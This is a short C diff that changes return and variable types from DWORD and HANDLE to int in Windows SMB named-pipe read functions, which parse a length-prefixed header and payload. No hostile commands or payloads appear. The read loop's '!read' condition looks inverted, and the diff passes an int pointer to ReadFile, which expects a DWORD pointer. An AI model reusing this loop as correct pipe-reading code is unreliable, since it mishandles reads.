@@ -6,9 +6,9 @@
 
 
 
-DWORD ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
+int ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
 {
-	DWORD totalRead = 0;
+	int totalRead = 0;
 
 	if (length <= 0)
 	{
@@ -18,7 +18,7 @@ DWORD ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
 		return totalRead;
 	}
 
-	DWORD read = 0;
+	int read = 0;
 	while (ReadFile(channel, &buffer[totalRead], length - totalRead, &read, NULL) && !read && totalRead < length) {
 		totalRead += read;
 	}
@@ -56,17 +56,17 @@ char* ProtocolHeaderGet(char* setting, int headerSize, int* pHeaderLength)
 	return header;
 }
 
-HANDLE ProtocolSmbRead(PROTOCOL* protocol, char* buffer, int length)
+int ProtocolSmbRead(PROTOCOL* protocol, char* buffer, int length)
 {
 	int headerSize;
 	char* header = ProtocolHeaderGet(buffer, 0, &headerSize);
-	DWORD totalHeaderRead = ProtocolSmbPipeRead(protocol->channel.handle, header, headerSize);
+	int totalHeaderRead = ProtocolSmbPipeRead(protocol->channel.handle, header, headerSize);
 	if (totalHeaderRead == -1 || totalHeaderRead != headerSize)
-		return INVALID_HANDLE_VALUE;
+		return -1;
 
 	int dataSize = *(int*)(header + headerSize - sizeof(int));
 	if ( dataSize < 0 || dataSize > length)
-		return INVALID_HANDLE_VALUE;
+		return -1;
 
 	return ProtocolSmbPipeRead(protocol->channel.handle, buffer, dataSize);
 }
